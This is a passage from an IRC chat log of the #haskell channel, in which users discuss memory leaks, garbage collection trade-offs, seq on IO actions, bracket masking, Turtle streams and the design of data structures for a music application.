15:15:23 <Cale> right
15:15:35 <orzo> well that would be consistent with what the gc stats told me before i quit
15:15:46 <orzo> my mutator time was far far less than my wall clock time
15:16:15 <orzo> but then, the bootstraping phase, which would be arodn 2 minutes wall-clock wouldn't account for the phase shift
15:16:44 <Cale> can you post it as an svg?
15:17:04 <orzo> the program participates in the ML-DHT network associated with bittorrent
15:17:04 <dfeuer> @pl \f -> Identity (fix (runIdentity . f))
15:17:04 <lambdabot> Identity . fix . (runIdentity .)
15:17:24 <orzo> to answer somebody's question
15:17:27 <Cale> ah
15:17:47 <Cale> So I'm guessing the quadratic behaviour doesn't really bode well
15:17:57 <hpc> dfeuer: mfix?
15:18:02 <orzo> no it's a leak
15:18:19 <ocharles> Does anyone know why :info in GHCI is only showing me one constructor from a data type, and then just `| ...`?
15:18:26 <ocharles> How do I get it to show all constructors?
15:18:49 <glguy> ocharles: Use :i on the type name
15:18:52 <hpc> ocharles: what data type?
15:18:55 <ocharles> oh, right
15:19:00 <ocharles> Yea, I'm using it on the constructor
15:19:01 <ocharles> duh
15:19:07 <hpc> heh
15:19:40 <dfeuer> hpc: yeah.
15:25:17 <askhask> so is there a language more "modern" than haskell in its design constraints?
15:25:34 <orzo> they should put wall-clock marks on the graph in addition even if it's not a consitent linear scale
15:25:46 <Tuplanolla> Well, there's Idris, askhask...
15:25:52 <hpc> and agda
15:26:03 <Cale> askhask: I suppose the dependently typed languages, like Agda, Idris, and Coq could be thought of that way
15:26:11 <askhask> is that it?
15:26:18 <hpc> just about
15:26:31 <hpc> haskell has a combination of design decisions that keeps it very fresh
15:26:47 <Cale> Haskell is still *somewhat* evolving too.
15:26:51 <hpc> and it's the target of a lot of CS research
15:26:53 <Tuplanolla> Coq (or Gallina) is, like Haskell, a bit older.
15:27:21 <hpc> language extensions and a conservative standard that leaves implementation details open are the big things
15:27:34 <glguy> askhask: That question is rather too vague to have a real answer. Is there an aspect in particular you're interested in?
15:27:37 <Cale> Yeah, it's hard to say that Coq is entirely more modern than Haskell -- in some ways, it's more old-fashioned
15:27:42 <MarcelineVQ> how old is mercury ?
15:27:51 <Cale> Pretty old
15:28:00 <MarcelineVQ> how about the lang?
15:28:18 <Cale> Mercury has been around since 1995 apparently
15:28:25 <Tuplanolla> I think Coq might even predate Haskell, but I don't remember the details.
15:28:32 <askhask> i've been programming for 20 years but am a programming lagnuage noob
15:28:40 <Cale> Tuplanolla: yeah, by a little bit, it does
15:28:55 <Cale> May 1, 1989 was the first release (but version 4.10 somehow)
15:29:06 <askhask> so i am kind of curious what the "most advanced" language is
15:29:10 <askhask> as languages go
15:29:11 <Tuplanolla> It's difficult to say though since these things first emerge from language-like fuzz.
15:29:36 <Cale> Haskell is basically open-source Miranda though
15:29:39 <Cale> at least, it was
15:29:50 <Cale> back in 1999 or so
15:31:11 <askhask> and what's this i hear about "some algorithms don't have non-imperative implementations" or that haskell is a great imperative language?
15:31:33 <Cale> askhask: Well, I think you could do worse than to pick up Haskell as a start, as most of the other languages that are actually making progress in various ways are similar to Haskell.
15:31:36 <askhask> do the promises of functional programming and implementation end up breaking down when you actually go to write stuff?
15:31:44 <Cale> (But Haskell is actually practical for real work now)
15:31:56 <Cale> No, they're even more apparent, I'd say
15:32:09 <Cale> You don't really understand how beneficial Haskell's type system is until you're working on a team
15:32:29 <hpc> askhask: imo it's one of the best imperative languages around
15:32:40 <hpc> askhask: because of purity (which factors out IO to its own type)
15:33:03 <hpc> askhask: and then being able to consider (IO ()) and simlar types of values in a first-class way
15:33:07 <orzo> i agree with everything you're saying Cale, except in my present circumnstances with a memory leak...  I think Haskell is uniquely bad at helping the coder with this
15:33:07 <hpc> :t forkIO
15:33:09 <lambdabot> error: Variable not in scope: forkIO
15:33:21 <askhask> hpc: so you're saying that when you actually go to implement, you end up writing C equivalent?
15:33:23 <Cale> orzo: Well, hey, you have a pretty heap profile graph to help ;)
15:33:25 <hpc> forkIO :: IO () -> IO ()
15:33:37 <Cale> orzo: But I agree, heap profiling could be a lot better
15:33:45 <hpc> askhask: not quite
15:34:49 <Cale> I think memory leaks are hard in almost any language -- I can't actually think of a language whose tools makes them much easier to deal with.
15:34:55 <orzo> Cale, here's a leak i fixed earlier with the help of a heap profile graph.  I still don't understand why the fix is a fix: http://lpaste.net/351645
15:35:27 <Tuplanolla> I take it you haven't used Valgrind, Cale.
15:35:47 <Cale> Tuplanolla: Not a whole lot, I have to admit
15:35:59 <hpc> askhask: C isn't that great of an imperative language imo, because it has that syntactic manipulation aspect of CPP and a lot of leaky abstractions over machine details
15:36:05 <geekosaur> valgrind can tell you what leaked and where but not necessarily how to avoid the leak
15:36:23 <hpc> it comes out more as a procedural language with a string replacement metalanguage on top of it
15:36:23 <Tuplanolla> I couldn't write C without it anymore. I'm spoiled.
15:36:54 <hpc> where you run a state machine over a particular configuration of memory
15:37:14 <Cale> Tuplanolla: With the amount of effort you spend dealing with memory management issues in C, I don't think it could possibly add up to being easier to deal with overall than in Haskell, even with valgrind ;)
15:38:03 <Tuplanolla> Well, these days I pretty much only write C when I don't need `malloc`, Cale.
15:38:17 <Cale> orzo: That one is interesting...
15:38:19 <geekosaur> it's only "easier" if you an avoid it entirely (rare) or are dealing with special memory management environments (think kernel) (where C is as evil as anything else but slightly less noisy)
15:38:57 <askhask> is garbage collection necessary/inevitable?
15:39:19 <Cale> askhask: It's desirable.
15:39:32 <Cale> askhask: Or you mean in Haskell?
15:39:44 <Cale> It would ruin Haskell to not have a garbage collector.
15:40:03 <orzo> Cale: the most straight forward trivial examples of 'forever' versus 'fix' did not reproduce the leak behavior
15:40:09 <Cale> Though there are possibly approaches you could take with region-based memory management
15:40:43 <askhask> garbage collection in a general context--is it necessary?
15:40:51 <orzo> i'd say no
15:40:55 <askhask> within haskell or not within haskell
15:41:01 <Cale> askhask: Well, no, obviously you can manage memory by hand if you really want to.
15:41:04 <orzo> with haskell, probably
15:41:17 <askhask> like, it's 2017, why are we still talking about memory management
15:41:21 <Cale> askhask: It's just tedious and error prone and usually you end up doing a worse job than a machine would in the end anyway
15:41:25 <askhask> i thought this problem would have been taken care of a long time ago
15:41:34 <askhask> right
15:41:34 <Cale> Well, it's not an easy problem
15:41:35 <hpc> askhask: because it's not a solved problem
15:41:38 <askhask> humans shouldn't do things that machines can
15:41:53 <askhask> so either machines can figure out when to allocate/dealloc
15:41:59 <uiop> in haskell you basically can't even loop without leaving garbage in the heap, so without a gc it would basically be ruined
15:41:59 <askhask> at compile time, or we need GC?
15:42:02 <hpc> it's a mostly mitigated problem, but as long as you can write programs that consume all your memory it still matters
15:42:05 <orzo> hm
15:42:08 <Cale> Well, the thing is, it's equivalent to the halting problem
15:42:19 <Cale> So you're never going to do it perfectly
15:42:25 <Cale> and a machine is never going to either
15:42:30 <glguy> orzo: What version of GHC was the forever leak on?
15:42:38 <orzo> 8.0.1
15:42:39 <taktoa> Cale: only if your programming language is turing complete ;)
15:42:47 <glguy> orzo: You're not the first person I've heard experience that
15:42:47 <hpc> non-turing-complete languages are starting to gain significance though
15:43:03 <hpc> so there might be some super-damn-fascinating rust derivative in our future
15:43:30 <uiop> i havent looked at rust since it was in its vwery beginning stages
15:43:51 <taktoa> hpc: yes, that was what I was getting at. Idris has uniqueness types, so it's not far off from that (well, surface syntax is very different, but type-system-wise)
15:43:52 <uiop> so what's the technical no-nonsense executive summary of rust's memory management?
15:44:01 <askhask> basically every language has tragic flaws
15:44:42 <askhask> so do people know whether allocation/deallocation can be planned in advance of runtime?
15:44:52 <askhask> whether or not a human does it,... preferablly not
15:44:55 <askhask> *preferably
15:45:22 <Tuplanolla> It can be solved for some cases, but not all, askhask.
15:45:23 <taktoa> uiop: "automatic compile-time GC with (mostly) inferred lifetimes, represented by affine types"
15:45:39 <taktoa> err, not GC
15:45:40 <uiop> askhask: it cannot be planned
15:45:48 <uiop> askhask: in the general case
15:46:04 <uiop> taktoa: thx
15:46:13 <askhask> so GC is inevitable?
15:46:22 <uiop> what does that mean askhask 
15:46:25 <uiop> "inevitable"
15:46:33 <orzo> glguy: I don't know what the cause is, but I'm now living with a superstitious fear of using 'forever' in any code.
15:46:55 <askhask> inevitable means that as we progress towards "better" programming languages
15:47:06 <taktoa> askhask: choose two from the set {completely automatic, turing complete, no runtime cost}
15:47:20 <askhask> which are faster, more succinct, provide stronger guarantees on code properties, etc
15:47:32 <lordcirth_> AFAIK, If you allocate memory during runtime differently as a result of input, then the compiler can't predict that completely, thus GC ?
15:47:34 <askhask> will we have GC systems on these better languages 100 or 500 years from now?
15:47:55 <glguy> orzo: what type do those computations have? I'm guessing IO based on your use of threadDelay, but then I'm confused by your use of liftIO (is that redundant?)
15:48:13 <taktoa> GC = turing complete + completely automatic
15:48:13 <taktoa> rust = no runtime cost + turing complete
15:48:13 <taktoa> idris (uniqueness types) = no runtime cost + completely automatic
15:48:16 <lordcirth> askhask, I would think so.  Probably way different abstractions around them, though.
15:49:01 <uiop> askhask: GC is more a function of the level at which a language is designed to operate. you'll always need a language to write the GC's in.
15:49:10 <uiop> s/GC/similar code/
15:49:16 <Tuplanolla> The divide between predictable-allocation and general-purpose languages is theoretically motivated and will stay with us, askhask.
15:49:21 <orzo> i can't relate to the desire for GC, it's one of those things I kept an open mind on when adventuring learning functional programming.  Memory management in C++ seems fine and reference-counting is all i've ever really needed.
15:49:30 <uiop> exactly what Tuplanolla said
15:50:00 <orzo> i'm not sure the ideal computer language will use GC
15:50:25 <askhask> the problem is that GC latency can be fatal or undesirable for a number of applications
15:50:35 <uiop> orzo: reference counting is slow compared to copying GC for many many things. C++ reference counting is the trade-off it accepts for not being able to copy stuff around
15:50:35 <askhask> and it's quite a serious proble
15:52:11 <askhask> is it possible to pay a fixed penalty (like 2x to 3x memory usage) and get pauseless GC?
15:52:29 <orzo> uiop: That may be so, but I suspect that most GC-enthusiasts are actually novice coders bitten by pointer bugs and the like.
15:53:23 <orzo> uiop: which means, it's overrated.
15:54:03 <taktoa> askhask: just don't ever collect :)
15:54:08 <taktoa> totally pauseless
15:54:37 <f-a> is there a way to make ghc show the unsugared version of a rec block (arrowloop)?
15:54:37 <taktoa> but yes, I think you've correctly identified a tradeoff
15:55:26 <geekosaur> f-a, possibly -ddump-ds
15:55:56 <taktoa> askhask: https://www.artima.com/lejava/articles/azul_pauseless_gc.html
15:56:22 <taktoa> though I've read that that technique ^ actually has very very short pauses
15:56:41 <plakband> I'm using http://lpaste.net/351682 to convert a type-level list into a term. Is there a reason there is nothing like this in Data.Singletons.Prelude.List? This seems like a common operation, but I feel I might be misunderstanding something
15:57:31 <orzo> uiop: If there's some easy accessible examples that show the power of GC from an efficiency stand-point, i'm interested.  The GC as a panacea for solving memory management issues is very obviously wrong, considering how hard it is to debug memory leaks in haskell.
15:57:34 <uiop> orzo: i think the point is that, it's only if we're restricting ourselves to having a *single* language that the question even comes up "is GC better than full manual control (and thus the impossibility of a fully automatic precise GC)"
15:57:43 <askhask> ok so can we get a haskell feature request for a pauseless GC option? ;)
15:58:13 <uiop> orzo: it's better to have at least two languages, one fully manual and one fully auto
15:58:17 <uiop> wrt mem
15:58:38 <Jophish__> foo f = pure (f x); foo :: (A -> b) -> IO b; bar f = f x; bar :: (A -> IO b) -> IO b; -- Is it right to consider foo more general than bar here or are they incomparable?
15:58:38 <Cale> askhask: there was a concurrent GC which was implemented that didn't stop the world, but it has significantly worse throughput than the current stop-the-world approach
15:58:53 <f-a> thanks geekosaur , I'll try this
15:58:53 <Tuplanolla> Pass in `-fcrap-throughput` to enable pauseless gc.
15:58:58 <Cale> (current GC is stop-the-world, but concurrent)
15:59:08 <askhask> Cale: how much lower?
15:59:38 <Cale> askhask: I don't remember, it was years ago that I read a paper about the concurrent GC in GHC.
15:59:58 <orzo> Tuplanolla: is that really the name of the option?
16:00:02 <orzo> heh
16:00:06 <Tuplanolla> No.
16:00:47 <Tuplanolla> Should be though.
16:05:03 <askhask> https://simonmar.github.io/bib/parallel-gc-08_abstract.html this?
16:07:35 <geekosaur> no, I think that's the current (parallel but not concurrent) gc
16:10:20 <Cale> Yeah, I don't remember exactly, can't seem to find it
16:10:48 <Cale> There are some newer papers than that one on the existing GC though
16:11:15 <Cale> https://www.microsoft.com/en-us/research/wp-content/uploads/2016/07/local-gc.pdf -- is from 2011
16:13:21 <Jophish__> I suppose it depends on how one defines "more general". Neither type subsumes the ither
16:13:29 <Jophish__> Other*
16:13:50 <Jophish__> However the set of values which inhabit them is equal in size
16:26:53 <orzo> does 'seq' do anything to values of type (IO a) ?
16:27:44 <Koterpillar> orzo: same thing as it does to any other values
16:27:49 <orzo> I guess an unevaluated (IO a) might be bottom, but an evaluated one is a thunk?
16:28:00 <Koterpillar> orzo: evaluated != executed
16:28:16 <orzo> what's the distinction
16:28:29 <Koterpillar> in particular, observe that the signature of seq is the same as flip const
16:28:45 <Koterpillar> the _value_ of putStrLn "hello" is an action that would print hello
16:29:18 <Koterpillar> when you execute it, hello appears
16:29:22 <orzo> oh, i don't expect 'seq' to run side-effecting code.  But i'm wondering if there is a memory-use  point to running seq on a (IO a)
16:29:43 <Koterpillar> there's nothing specific about IO in here
16:30:15 <Koterpillar> f = if (isPrime 45678901) then putStrLn "hello" else return ()
16:30:23 <Koterpillar> this will benefit from seq, I suppose
16:31:17 <orzo> would it ever make sense to say:  return $! putStrLn "hello"
16:31:42 <orzo> as opposed to the non-strict $ version
16:34:11 <orzo> i mean, my intention is to return a thunk, but maybe it's better to avoid some pointless indirection with the lazy version?
16:35:38 <Koterpillar> orzo: did you do any IO actions before this?
16:35:59 <Koterpillar> orzo: putStrLn "one" >> putStrLn "two" will not be affected by seq, because it needs to evaluate (>>) first
16:36:41 <Koterpillar> (my understanding is a bit vague; I suggest you put some trace in there to check)
16:37:53 <orzo> i'm not sure a trace could tell me anything
16:38:22 <orzo> a trace on the putStrLn "hello" will be emitted with the $! but not with the $, I expect
16:38:33 <askhask> so is writing software ultimately an empirical process?
16:38:45 <orzo> but that doesn't actually mean that enevaluated putStrLn is represented differently than evaluated
16:39:06 <Koterpillar> orzo: you can have a negative result
16:39:10 <askhask> that is to say, in many or most "real world" situations, can you only  tell that software works by using it a lot?
16:39:24 <ggVGc> define works
16:39:34 <orzo> askhask: in short, yes
16:39:45 <Koterpillar> orzo: what would it tell you if trace didn't fire?
16:39:55 <ggVGc> all software does exactly what the code in it says, so in that sense all software works
16:40:49 <askhask> and furthermore that "works" can only be qualified as a statistical phenomenon?
16:40:53 <orzo> i suppose it'd tell me 2 things, one: that seq was indeed a no-op, and two, trace is a magical compiler primitive rather than what i thought it was
16:40:54 <monochrom> seq is unlikely to cause effects to happen
16:41:03 <askhask> that is to say, i fly my airplane control software on thousands of airplanes
16:41:12 <Koterpillar> orzo: (putStrLn "one" >> trace "trace" (putStrLn "two")) `seq` return ()
16:41:32 <askhask> and then on the one or two occasions when the airplane decides to dive, i go into the code and find why that happened
16:41:35 <Koterpillar> orzo: (trace "trace" (putStrLn "two")) `seq` return ()
16:42:57 <monochrom> askhask: You can only tell that my brain works by watching me a lot.
16:42:57 <Koterpillar> orzo: in the first case, seq is happy enough to see (>>) at the top level
16:43:20 <askhask> and then if i dont have any airplane dives for the next ten years,... i can have confidence that the airplanes won't dive,... but only confidence?
16:43:51 <askhask> monochrom: that's kind of excessive 
16:43:51 <Koterpillar> askhask: people used to think that Newton physics "works"
16:44:21 <geekosaur> it works fine as long as you're not moving at the speed of light or smaller than a grain of dust >.>
16:44:32 <geekosaur> s/at/almost at/
16:44:57 <askhask> newtonian physics works for a huge range of phenomena,... but more importantly
16:45:04 <askhask> if newtonian physics works for a given phenomenon today,
16:45:07 <askhask> it will also work tomorrow
16:45:12 <monochrom> It is not excessive. You started with general "software". Airplane control is a very simplistic case where people can actually prove things.
16:45:15 <askhask> if a program works today, it may not work tomorrow
16:45:29 <Koterpillar> well, if my door works today, it might break tomorrow
16:45:47 <monochrom> But Google's search algorithm is also "software", and it suffers just the same uncertainties as my brain. In fact I think Google is more complex than my brain.
16:45:52 <orzo> askhask: if you reproduce the exact circumstance for what it worked on, then i expect you'll see a similar result tomorow
16:46:02 <askhask> monochrom: really? i had read that airplane control was hugely heuristic
16:46:27 <monochrom> Oh, it's all relative isn't it?
16:47:01 <monochrom> Airplane control is more complex than my toy programs. But still laughably simpler than Google or high-frequency trading or ...
16:48:29 <monochrom> But you should look up David Parnas and his work on using formal methods for some airplane software. It shows you how this piece is still within reach for full analysis.
16:49:42 <monochrom> At which point, the question is no longer "will the software do the right thing tomorrow?", but rather "will the hardware sensors give true readings to the software tomorrow?"
16:50:56 * ggVGc can't tell that monochrom's brain works
16:51:39 <geekosaur> how can you tell anyone's brain works? maybe we're all figments of an AI pretending to be an IRC server
16:52:03 <ggVGc> what's the difference?
16:52:15 <monochrom> In that case you can still ask "does this figment work?" :)
16:52:46 <Tuplanolla> It would be pretty cool if you were all machines.
16:52:55 <monochrom> "What does 'my brain' mean?" --- A question on referential transparency.
16:53:47 <monochrom> I need to close this by sharing you my recent invention:
16:53:50 <M0000> question about a music application here: http://lpaste.net/351685
16:53:55 <monochrom> @quote monochrom lisp.*haskell
16:53:56 <lambdabot> No quotes match.
16:54:00 <ggVGc> What colour is your imagination? Referentially transparent
16:54:09 <monochrom> hrm, no? nevermind.
16:54:35 <ggVGc> monochrom: what's the question?
16:54:47 <ggVGc> sorry
16:54:49 <ggVGc> M0000: 
16:54:52 <monochrom> (Something about "Every sufficiently advanced Lisp program contains a partial implementation of Haskell")
16:55:01 <ggVGc> you want feedback of your data structures?
16:55:39 <ggVGc> M0000: imo, the way you find out if your data structures are sound, is if the functions you need to write come out okay without needing to transform the data a lot
16:55:56 <monochrom> My advice would be "eradicate all type synonyms".
16:56:14 <ggVGc> sounds violent
16:56:36 <dfeuer> Is/was there a known problem with cabal/quickcheck/test-framework/whatever causing tests invoked via `cabal test` to freeze in a `pause` system call?
16:56:58 <dfeuer> Because I'm seeing that with  cabal test seq-properties in containers....
16:57:06 <M0000> ggVGc: I have a “use case” and wondered what a Haskelly way to approach it is — although maybe it needs more work to determine
16:57:54 <M0000> it’s big hierarchical data and the desire is write functions that can access pieces of it as well as look elsewhere in it — move “up” and “down” the hiearchy
16:58:09 <M0000> and modify it, too
16:58:58 <M0000> when you say “not need to transform the data”, what I’m thinking is that certain data is fixed throughout the application, and certain data is computed… and I want to keep them separate, perhaps?
16:59:39 <M0000> Like if I have a hiearchy of fixed data, and then need to compute attributes of pieces of that hiearchcy, I store those attribtues in a separate data struct that identifies their position in the hiearchy?
17:04:32 <dfeuer> Oh, I figured it out.
17:04:34 <dfeuer> Never mind.
17:04:44 <dfeuer> Grey hole rather than black hole.
17:04:46 <dfeuer> *sigh*
17:04:58 <monochrom> Intrigung
17:17:39 <orzo> "A retainer is either the system stack, an unevaluated closure (thunk), or an explicitly mutable object."  I tend to think I see only unevaluated closures in my heap graph.  I don't really understand the otehr two cases
17:18:10 <orzo> can i tell what case i'm looking at by how it is marked in .prof ?
17:18:56 <orzo> is an explicitly mutable object something like an IORef or TVar?
17:19:49 <monochrom> The system stack holds actual parameters to functions. They can be the roots of all the heap objects you want live.
17:22:48 <orzo> in .prof, each of the "SET nnn = ..." is a reference to a single retainer object, right?
17:24:14 <orzo> and theres no way to tell by it whether it is a function parameter, unevaluated thunk, or mutable object, right?
17:24:40 <codedmart> If I have a list ["some.element", "element", "other", "some", "other.element"]. Is there a fn already for that or do I need to write my own?
17:25:05 <codedmart> If I want to see if any elements contain "element".
17:25:18 <codedmart> elem only matches exactly.
17:25:55 <monochrom> You should probably use "filter" with "isInfixOf" and then check for non-emptiness.
17:26:14 <monochrom> No, use "any" with "isInfixOf"
17:26:24 <codedmart> OK I was thinking of something like that but didn't want to if there was something already.
17:26:25 <codedmart> Thanks
17:32:09 <kadoban> Wonder when there's gonna be a stackage LTS with 8.0.2
17:32:19 <ertes> in (bracket o c k), are o and c masked by default, or do i need (mask $ \unmask -> bracket o c (unmask . k)) explicitly?
17:34:34 <monochrom> I forgot which one is c and which one is k.
17:34:38 <xpika> How can I programatically lookup the package for a particular module. Say map Data.Text to the package "text"
17:35:10 <geekosaur> xpika, hayoo is good for that. or if it's an installed package, there's ghc-pkg find-moduke 
17:35:13 <geekosaur> *find-module
17:35:24 <monochrom> o and c are under mask.
17:36:26 <monochrom> k is under a restore.
17:36:35 <monochrom> err, unmask
17:38:13 <xpika> is there a stackage package for installing ALL of lts ?
17:38:33 <ertes> monochrom: thanks
17:38:41 <ertes> this should probably be documented
17:38:51 <xpika> geekosaur: thanks. Didn't know about ghc-pkg find-module
17:39:03 <monochrom> Yeah, would be nice to say it in the blurb so I didn't have to check source code.
17:39:47 <orzo> "This code guarantees that acquire is paired with release, by masking asynchronous exceptions for the critical parts. (Rather than write this code yourself, it would be better to use bracket which abstracts the general pattern)."
17:40:01 <orzo> that's from the blurb attached to Control.Exception.mask
17:40:10 <monochrom> Also, o and c are under the same mask scope.
17:40:44 <orzo> monochrom: that's evident from the code quote immediately above what i quoted
17:40:55 <orzo> so it is documented
17:41:01 <monochrom> orzo, we are referring to the doc of bracket
17:41:02 <orzo> maybe just not on 'bracket'
17:41:43 <monochrom> You will find yourself complaining at a similar phenomenon the next time you read a math book.
17:43:12 <orzo> i wish other languages would link source the way haskell/haddock do
17:43:24 <monochrom> A proof on page 439 would go like "Since f(x,y) = f(y,x), therefore...", and you will ask the teacher how do we know f(x,y) = f(y,x) in the first place.
17:43:42 <monochrom> And the teacher will answer "but it's from a theorem 200 pages ago!"
17:43:49 <orzo> heh
17:59:09 <guiyaz> hello!
17:59:14 <dmj`> hi
17:59:49 <guiyaz> might I say that this is the nicest community I have seen.
18:16:44 <fragamus> ls :: Turtle.FilePath -> Shell Turtle.FilePath
18:18:13 <fragamus> I want to take the stream from ls and create a stream of lines for each Turtle.FilePath
18:18:45 <fragamus> so like convert one stream into another like pipes in linux
18:18:54 <M0000> I have a question here http://lpaste.net/351685
18:19:35 <M0000> question is kind of long, but gist is hiearichal data structures that have static components and also computed data that changes sometimes
18:20:23 <M0000> wanting to minimize needed arguments in functions, simplify things, application is music performance and on the whole it’s pretty complicated so there’s a real need to understand how to simplify
18:20:47 <fragamus> it seems like Turtle can do this
18:21:54 <geekosaur> fragamus, foldIO?
18:22:09 <fragamus> lemme see
18:22:30 <Koterpillar> M0000: why is alterTiming :: Note -> (Double, Double) and not Note -> ... -> Note?
18:23:15 <M0000> because I was thinking that Note contains static data, and (Double,Double) is computed data which at the beginning of the creation of the data doesn’t exist
18:23:30 <Koterpillar> M0000: OK, so what does alterTiming alter?
18:23:44 <Koterpillar> M0000: you had a Note. Now you have two Doubles. What changed?
18:23:45 <M0000> if it is stored in Note, then I need to add two Double components, but they will be meaningless
18:23:50 <M0000> oh, yes,
18:24:23 <M0000> alterTiming may be bad name — basically a Note has a default timing computation, and alterTiming will create values to be added to that default computation
18:24:41 <Koterpillar> create values?
18:24:46 <M0000> but the default times may or may not be computed at the time alterTiming is called
18:25:00 <Koterpillar> M0000: do you want to produce a different Note, or not?
18:25:02 <geekosaur> fragamus, alternately I would guess that >>= binds a function Turtle.FilePath -> Turtle <something> where <something> is the file contents in your case, so you can just use liftIO readFile or something like that
18:25:09 <M0000> a Note represents a msucial concept that has a position in time expressed as a measure and beat
18:25:30 <M0000> but to make the note sound, this must be mapped to a time in seconds
18:25:31 <geekosaur> although see Turtle.Lines, it may need to be trickier than that
18:25:38 <fragamus> thanks geekosaur
18:25:49 <Koterpillar> M0000: what's an example value of Pitch?
18:25:53 <Koterpillar> M0000: what's an example value of Notehead?
18:26:03 <M0000> the Note doesn’t change in the sense the musical concept doesn’t change, but the attributes or means of playback may change
18:26:04 <geekosaur> er, liftIO . readFile
18:26:16 <M0000> type Pitch = Int, for the most part
18:26:23 <Koterpillar> M0000: and Notehead?
18:26:29 <M0000> data Notehead = Solid | Hollow | Diamon
18:26:32 <Koterpillar> okay
18:26:37 <Koterpillar> so Note 1 Solid is a Note?
18:26:46 <M0000> yes
18:26:54 <Koterpillar> M0000: what is the value of: alterTiming (Note 1 Solid)?
18:27:22 <M0000> let me back up, a musical score has notes which are grouped in chords which are grouped in voices which are grounped in staves
18:27:25 <Koterpillar> M0000: I suggest you re-read any Haskell books you were reading to get a better understanding at function syntax. For example...
18:27:29 <Koterpillar> :t negate
18:27:31 <lambdabot> Num a => a -> a
18:28:00 <Koterpillar> M0000: your alterTiming function takes a Note, which does _not_ have any time information in it, and somehow produces two Doubles
18:28:08 <M0000> to determine the timing of a Note requires knowing the Chord it’s a part of, the Voice that is a part of, the Staff that is a part of, and the Score that is a part of
18:28:41 <Koterpillar> M0000: careful
18:28:49 <M0000> yes?
18:29:00 <Koterpillar> M0000: Chord [Note 1 Solid, Note 1 Solid, Note 1 Solid] sampleChordAttr
18:29:05 <Koterpillar> see how notes are all the same?
18:29:12 <M0000> Yes
18:29:23 <M0000> so Set Pitch?
18:29:24 <Koterpillar> so if your function takes this Chord and one of the Notes in it, it can't give me the timing
18:29:46 <M0000> because it can’t uniquely identify the Note?
18:29:49 <Koterpillar> exactly
18:30:03 <Koterpillar> so for each of your containers, what you need to get the timing is not the _value_ of the item, but its index
18:30:23 <M0000> hmmm… well in a practical sense this data structure is created by reading MusicXML, which
18:30:31 <M0000> if sane, will never create that case
18:30:33 <Koterpillar> therefore, alterTiming :: StaffName -> VoiceNumber -> Pos -> Int -> (Double, Double)
18:30:40 <geekosaur> fragamus, in fact looking this over I think you want something like ls ... >>= readTextFile 
18:30:50 <M0000> Koterpillar: yes
18:31:07 <geekosaur> or possibly <|> instead of >>
18:31:21 <geekosaur> *instead of >>=
18:31:25 <M0000> what I’m kind of asking is whether a Note should be defined as Note StaffName VoiceNumber Pos Int Pitch Notehead
18:31:40 <M0000> so one argument can be passed
18:31:51 <M0000> that creates a lot of redundant data, but in this application it’s no matter
18:32:00 <Koterpillar> what other functions do you want on this?
18:32:06 <Koterpillar> M0000: you can encode this as some kind of Position { posSN :: StaffName, posVN :: VoiceNumber, posInChord :: Pos, ... }
18:32:10 <Koterpillar> and pass that argument around
18:32:27 <M0000> yeah that sounds good
18:32:39 <Zemyla> Is there an interesting, sub-Turing computational formalism with decidable equality between functions?
18:33:05 <M0000> I am not sure what I want .. by the way this application exists in an awkward form now, what I am realizing is that because it’s experimental I am always changing it and I have created quite an unwieldy program
18:33:48 <M0000> I am even thinking of working more in GHCI and bringing some scripting-like features, because the need here is to try stuff quick and dirty
18:34:32 <ertes> Zemyla: define types 0 and 1 and type operators (+) and (*) to get the usual semiring of types, then disallow general recursion
18:34:46 <ertes> Zemyla: this basically constrains all types to be finite
18:35:11 <Zemyla> So you can compare two primitive recursive functions for equality?
18:35:56 <ertes> Zemyla: since the domain is finite, you can just compare the images
18:35:57 <M0000> so I might have data Value = ValInt Int | ValDoub Double | ValString String and set up some Map String Value structures in GHCI
18:36:23 <M0000> so I can’t experimentally change how I’m doing or configuring things quick and dirty
18:36:28 <M0000> so I CAN
18:37:01 <ertes> Zemyla: not sure if this is useful though
18:37:06 <ertes> probably not
18:37:50 * geekosaur tempted to point to
18:38:08 <geekosaur> @hackage universe
18:38:08 <lambdabot> http://hackage.haskell.org/package/universe
18:39:03 <geekosaur> at one point dmwit was showing off equality of functions (provided their domains and ranges were instances)
18:40:49 <monochrom> If f is a linear function (the linear algebra kind) with a finite-dimension domain, you only need to test f at finitely many samples. :)
18:40:56 * monochrom is learning linear algebra lately!
18:45:07 <fragamus> fold (ls "hopper") Fold.head
18:45:07 <fragamus>   :: MonadIO io => io (Maybe Turtle.FilePath)
19:08:44 <cale2> hey moritz
19:14:10 <orzo> i've got a live hp profile with hp2any.  I had to patch it to make it build, which surprised me
19:14:44 <orzo> seems like a nifty tool for debuging haskell daemons
20:43:28 <M0000> I was helped earlier today, I forget his handle, but it was nice. you know the movie “Philadelpia” where the lawyer says to every client, “Explain it to me like I’m a five-year-old”
20:43:52 <M0000> There’s a lot to be learned from explaining part of my app and noticing the immediate points of confusion in the other person
20:44:32 <M0000> it’s a challenge… can you take any part of your app and explain it simply? If you can’t do that with any part of your app, maybe time to rethink it
20:59:58 <glguy> M0000: Have you heard of https://en.wikipedia.org/wiki/Rubber_duck_debugging ?
21:03:15 <M0000> I hadn’t heard that term — it’s really amusing but also SOO true… just have to laugh
21:05:26 <Axman6> it's a very common and well known phenomenon
21:07:53 <M0000> Axman6: I don’t program now, but at my old place it was common for people to learn from explaining code … what’s new to me is aiming for greater simplicity.. I program as a hobby now and I’m far better than I ever was while working, thanks to studying Haskell
21:08:10 <M0000> I never realized just how far simplicity can go....
21:09:00 <M0000> so the idea of explaining it to a rubber duck, makes me think of explaining it in terms so simple that a duck could relate . maybe that’s not the actual point.. anyway explaining it to a five-year-old works too
21:16:04 <orzo> is there an operator for flip <$> ?
21:16:45 <glguy> :t (<&>)
21:16:47 <lambdabot> Functor f => f a -> (a -> b) -> f b
21:26:13 <uiop> orzo: RE: you earlier talking about it being hard to find space leaks in haskell...
21:27:25 <uiop> orzo: it comes with experience. at least, experience is the only unqualified solution.. tools may help, tools may come and go, but experience is the only hard solution here (in my experience)
21:29:29 <uiop> my own personal philosophy, and i have no doubt many many here's opinions will differ from mine, but my personal opinion is... i prefer to actively explicitly force *everything* *EXCEPT* the things i'm explicitly on purpose and with reason intending to be lazy in order for them to work properly
21:30:15 <uiop> this way, you basically have a small list of where laziness-induced accidental space leaks come from
21:30:31 <uiop> because almost by definition, they arent accidents at all when they're all intended
21:30:55 <uiop> instead they're a result of faulty logic
21:33:18 <uiop> .. and i used slight hyperbole there, but only to make my point
21:33:58 <uiop> once you get to the point where you're doing everything on purpose, if something blows up (space-wise)
